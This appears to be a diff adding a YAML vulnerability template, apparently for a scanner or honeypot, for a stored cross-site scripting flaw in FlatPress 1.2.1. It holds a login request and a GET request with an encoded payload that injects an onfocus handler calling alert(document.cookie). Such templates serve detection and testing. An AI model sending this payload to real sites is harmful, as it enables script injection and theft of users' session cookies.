@@ -1,0 +1,56 @@
+id: flatpress-xss
+info:
+  name: FlatPress 1.2.1 - Stored Cross-Site Scripting
+  author: arafatansari
+  description: 'FlatPress 1.2.1 contains a stored cross-site scripting vulnerability
+    that allows for arbitrary execution of JavaScript commands through blog content.
+    An attacker can steal cookie-based authentication credentials and launch other
+    attacks. Note: this is similar to CVE-2021-41432, however this attack uses the
+    "page" parameter.
+
+    '
+  severity: medium
+  reference:
+  - https://github.com/flatpressblog/flatpress/issues/153
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"Flatpress"
+  tags: flatpress,xss,authenticated,oss,intrusive
+traps:
+- request:
+    method: POST
+    path: /login.php
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp
+    body: |
+      ------WebKitFormBoundarykGJmx9vKsePrMkVp
+      Content-Disposition: form-data; name="user"
+
+      {{username}}
+      ------WebKitFormBoundarykGJmx9vKsePrMkVp
+      Content-Disposition: form-data; name="pass"
+
+      {{password}}
+      ------WebKitFormBoundarykGJmx9vKsePrMkVp
+      Content-Disposition: form-data; name="submit"
+
+      Login
+      ------WebKitFormBoundarykGJmx9vKsePrMkVp--
+  response:
+    status_code: 200
+    headers: {}
+    body: value=""onfocus="alert(document.cookie)"autofocus=""FlatPress
+- request:
+    method: GET
+    path: /admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.cookie%29%22autofocus%3d%22
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
